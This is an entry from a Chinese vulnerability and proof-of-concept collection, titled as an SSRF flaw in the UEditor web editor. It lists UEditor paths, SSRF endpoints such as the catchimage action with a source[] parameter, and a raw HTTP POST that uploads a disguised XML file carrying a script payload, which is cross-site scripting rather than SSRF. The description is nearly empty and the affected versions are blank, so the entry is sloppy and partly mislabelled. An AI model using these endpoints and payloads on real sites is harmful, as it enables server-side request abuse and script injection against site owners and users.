---
source: "wy876 漏洞文库"
---

# ueditor存在SSRF漏洞

### 一、漏洞描述
ueditor存在SSRF漏洞

### 二、影响版本


### 三、漏洞复现
Ueditor路径：

```plain
/ueditor/
/ueditor-1.4.3.3/net/
/ueditor1_4_3_3-utf8-net/utf8-net/
/utf8-net/
```

查看版本：

```plain
/ueditor/ueditor.all.js
```

SSRF路径

```plain
/jsp/controller.jsp?action=catchimage&source[]=
/jsp/getRemoteImage.jsp?upfile=
/php/controller.php?action=catchimage&source[]=
```

PHP版本：

```plain
/ueditor/php/controller.php?action=catchimage&source[]=x.x.x
```


JSP版本：

```plain
POST /ueditor/jsp/controller.jsp?action=uploadfile&encode=utf-8 HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynJAiy5Qly8XpmZmQ
Content-Length: 323


------WebKitFormBoundarynJAiy5Qly8XpmZmQ
Content-Disposition: form-data; name="upfile"; filename="1.xml"
Content-Type: image/png

<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
</body>
</html>
------WebKitFormBoundarynJAiy5Qly8XpmZmQ--
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/nvizlic3zcdfd5rg>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
